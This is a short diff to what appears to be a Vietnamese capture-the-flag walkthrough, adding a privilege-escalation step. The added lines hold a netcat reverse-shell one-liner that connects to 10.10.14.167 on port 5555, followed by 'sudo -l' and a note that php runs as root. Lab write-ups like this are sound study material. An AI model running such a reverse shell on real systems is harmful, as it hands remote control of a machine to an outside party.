@@ -26,6 +26,10 @@ Lấy flag user
 
 ## Leo quyền
 
+Cần tạo reverse shell để leo quyền 
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.167 5555 >/tmp/f`
+
 `sudo -l`
 
 Ta thấy có php chạy quyền root
